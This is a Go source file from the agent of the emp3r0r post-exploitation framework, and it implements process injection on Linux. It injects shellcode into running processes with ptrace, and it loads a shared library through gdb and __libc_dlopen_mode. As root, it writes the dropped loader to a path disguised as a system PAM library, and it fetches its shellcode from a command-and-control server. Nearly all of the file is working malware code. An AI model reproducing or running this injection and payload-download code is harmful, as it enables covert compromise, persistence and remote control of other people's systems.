package agent

// build +linux

import (
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	golpe "github.com/jm33-m0/go-lpe"
)

// inject a shared library using dlopen
func gdbInjectSO(path_to_so string, pid int) error {
	gdb_path := emp3r0r_data.UtilsPath + "/gdb"
	if !util.IsFileExist(gdb_path) {
		res := VaccineHandler()
		if !strings.Contains(res, "success") {
			return fmt.Errorf("Download gdb via VaccineHandler: %s", res)
		}
	}

	temp := "/tmp/emp3r0r"
	if util.IsFileExist(temp) {
		os.RemoveAll(temp) // ioutil.WriteFile returns "permission denied" when target file exists, can you believe that???
	}
	err := CopySelfTo(temp)
	if err != nil {
		return err
	}

	if pid == 0 {
		cmd := exec.Command("sleep", "10")
		err := cmd.Start()
		if err != nil {
			return err
		}
		pid = cmd.Process.Pid
	}

	gdb_cmd := fmt.Sprintf(`echo 'print __libc_dlopen_mode("%s", 2)' | %s -p %d`,
		path_to_so,
		gdb_path,
		pid)
	out, err := exec.Command(emp3r0r_data.UtilsPath+"/bash", "-c", gdb_cmd).CombinedOutput()
	if err != nil {
		return fmt.Errorf("%s: %s\n%v", gdb_cmd, out, err)
	}

	return nil
}

// Injector inject shellcode to arbitrary running process
// target process will be restored after shellcode has done its job
func Injector(shellcode *string, pid int) error {
	// format
	*shellcode = strings.Replace(*shellcode, ",", "", -1)
	*shellcode = strings.Replace(*shellcode, "0x", "", -1)
	*shellcode = strings.Replace(*shellcode, "\\x", "", -1)

	// decode hex shellcode string
	sc, err := hex.DecodeString(*shellcode)
	if err != nil {
		return fmt.Errorf("Decode shellcode: %v", err)
	}

	// inject to an existing process or start a new one
	// check /proc/sys/kernel/yama/ptrace_scope if you cant inject to existing processes
	if pid == 0 {
		// start a child process to inject shellcode into
		sec := strconv.Itoa(util.RandInt(10, 30))
		child := exec.Command("sleep", sec)
		child.SysProcAttr = &syscall.SysProcAttr{Ptrace: true}
		err = child.Start()
		if err != nil {
			return fmt.Errorf("Start `sleep %s`: %v", sec, err)
		}
		pid = child.Process.Pid

		// attach
		err = child.Wait() // TRAP the child
		if err != nil {
			log.Printf("child process wait: %v", err)
		}
		log.Printf("Injector (%d): attached to child process (%d)", os.Getpid(), pid)
	} else {
		// attach to an existing process
		proc, err := os.FindProcess(pid)
		if err != nil {
			return fmt.Errorf("%d does not exist: %v", pid, err)
		}
		pid = proc.Pid

		// https://github.com/golang/go/issues/43685
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		err = syscall.PtraceAttach(pid)
		if err != nil {
			return fmt.Errorf("ptrace attach: %v", err)
		}
		_, err = proc.Wait()
		if err != nil {
			return fmt.Errorf("Wait %d: %v", pid, err)
		}
		log.Printf("Injector (%d): attached to %d", os.Getpid(), pid)
	}

	// read RIP
	origRegs := &syscall.PtraceRegs{}
	err = syscall.PtraceGetRegs(pid, origRegs)
	if err != nil {
		return fmt.Errorf("my pid is %d, reading regs from %d: %v", os.Getpid(), pid, err)
	}
	origRip := origRegs.Rip
	log.Printf("Injector: got RIP (0x%x) of %d", origRip, pid)

	// save current code for restoring later
	origCode := make([]byte, len(sc))
	n, err := syscall.PtracePeekText(pid, uintptr(origRip), origCode)
	if err != nil {
		return fmt.Errorf("PEEK: 0x%x", origRip)
	}
	log.Printf("Peeked %d bytes of original code: %x at RIP (0x%x)", n, origCode, origRip)

	// write shellcode to .text section, where RIP is pointing at
	data := sc
	n, err = syscall.PtracePokeText(pid, uintptr(origRip), data)
	if err != nil {
		return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(origRip), pid, err)
	}
	log.Printf("Injected %d bytes at RIP (0x%x)", n, origRip)

	// peek: see if shellcode has got injected
	peekWord := make([]byte, len(data))
	n, err = syscall.PtracePeekText(pid, uintptr(origRip), peekWord)
	if err != nil {
		return fmt.Errorf("PEEK: 0x%x", origRip)
	}
	log.Printf("Peeked %d bytes of shellcode: %x at RIP (0x%x)", n, peekWord, origRip)

	// continue and wait
	err = syscall.PtraceCont(pid, 0)
	if err != nil {
		return fmt.Errorf("Continue: %v", err)
	}
	var ws syscall.WaitStatus
	_, err = syscall.Wait4(pid, &ws, 0, nil)
	if err != nil {
		return fmt.Errorf("continue: wait4: %v", err)
	}

	// what happened to our child?
	switch {
	case ws.Continued():
		return nil
	case ws.CoreDump():
		err = syscall.PtraceGetRegs(pid, origRegs)
		if err != nil {
			return fmt.Errorf("read regs from %d: %v", pid, err)
		}
		return fmt.Errorf("continue: core dumped: RIP at 0x%x", origRegs.Rip)
	case ws.Exited():
		return nil
	case ws.Signaled():
		err = syscall.PtraceGetRegs(pid, origRegs)
		if err != nil {
			return fmt.Errorf("read regs from %d: %v", pid, err)
		}
		return fmt.Errorf("continue: signaled (%s): RIP at 0x%x", ws.Signal(), origRegs.Rip)
	case ws.Stopped():
		stoppedRegs := &syscall.PtraceRegs{}
		err = syscall.PtraceGetRegs(pid, stoppedRegs)
		if err != nil {
			return fmt.Errorf("read regs from %d: %v", pid, err)
		}
		log.Printf("Continue: stopped (%s): RIP at 0x%x", ws.StopSignal().String(), stoppedRegs.Rip)

		// restore registers
		err = syscall.PtraceSetRegs(pid, origRegs)
		if err != nil {
			return fmt.Errorf("Restoring process: set regs: %v", err)
		}

		// breakpoint hit, restore the process
		n, err = syscall.PtracePokeText(pid, uintptr(origRip), origCode)
		if err != nil {
			return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(origRip), pid, err)
		}
		log.Printf("Restored %d bytes at origRip (0x%x)", n, origRip)

		// let it run
		err = syscall.PtraceDetach(pid)
		if err != nil {
			return fmt.Errorf("Continue detach: %v", err)
		}
		log.Printf("%d will continue to run", pid)

		return nil
	default:
		err = syscall.PtraceGetRegs(pid, origRegs)
		if err != nil {
			return fmt.Errorf("read regs from %d: %v", pid, err)
		}
		log.Printf("continue: RIP at 0x%x", origRegs.Rip)
	}

	return nil
}

// Inject loader.so into any process
func GDBInjectSO(pid int) error {
	so_path := emp3r0r_data.UtilsPath + "/libtinfo.1.2.so"
	if os.Geteuid() == 0 {
		root_so_path := "/usr/lib/x86_64-linux-gnu/libpam.so.0.0.1"
		so_path = root_so_path
	}
	if !util.IsFileExist(so_path) {
		out, err := golpe.ExtractFileFromString(emp3r0r_data.LoaderSO_Data)
		if err != nil {
			return fmt.Errorf("Extract loader.so failed: %v", err)
		}
		err = ioutil.WriteFile(so_path, out, 0644)
		if err != nil {
			return fmt.Errorf("Write loader.so failed: %v", err)
		}
	}
	return gdbInjectSO(so_path, pid)
}

// InjectShellcode inject shellcode to a running process using various methods
func InjectShellcode(pid int, method string) (err error) {
	// prepare the shellcode
	prepare_sc := func() (shellcode string, shellcodeLen int) {
		sc, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/shellcode.txt", "")

		if err != nil {
			log.Printf("Failed to download shellcode.txt from CC: %v", err)
			sc = []byte(emp3r0r_data.GuardianShellcode)
			err = CopySelfTo(emp3r0r_data.GuardianAgentPath)
			if err != nil {
				return
			}
		}
		shellcode = string(sc)
		shellcodeLen = strings.Count(string(shellcode), "0x")
		log.Printf("Downloaded %d of shellcode, preparing to inject", shellcodeLen)
		return
	}

	// dispatch
	switch method {
	case "gdb":
		err = GDBInjectSO(pid)
	case "native":
		shellcode, _ := prepare_sc()
		err = Injector(&shellcode, pid)
	default:
		err = fmt.Errorf("%s is not supported", method)
	}
	return
}
